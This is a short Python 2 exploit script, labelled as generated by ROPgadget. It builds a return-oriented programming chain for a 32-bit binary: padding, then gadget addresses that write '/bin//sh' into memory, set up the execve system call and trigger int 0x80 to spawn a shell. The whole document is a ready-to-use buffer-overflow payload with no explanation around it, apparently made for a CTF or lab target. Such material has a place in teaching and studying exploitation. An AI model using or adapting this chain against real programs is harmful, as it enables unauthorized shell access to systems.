#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''
p += 'A'*22

p += pack('<I', 0x08083b4a) # pop edx ; ret
p += pack('<I', 0x080ff060) # @ .data
p += pack('<I', 0x080cc696) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080ac67d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08083b4a) # pop edx ; ret
p += pack('<I', 0x080ff064) # @ .data + 4
p += pack('<I', 0x080cc696) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080ac67d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08083b4a) # pop edx ; ret
p += pack('<I', 0x080ff068) # @ .data + 8
p += pack('<I', 0x0805e4a0) # xor eax, eax ; ret
p += pack('<I', 0x080ac67d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e9) # pop ebx ; ret
p += pack('<I', 0x080ff060) # @ .data
p += pack('<I', 0x08083b71) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ff068) # @ .data + 8
p += pack('<I', 0x080ff060) # padding without overwrite ebx
p += pack('<I', 0x08083b4a) # pop edx ; ret
p += pack('<I', 0x080ff068) # @ .data + 8
p += pack('<I', 0x0805e4a0) # xor eax, eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x0809059f) # inc eax ; ret
p += pack('<I', 0x08052301) # int 0x80

print p

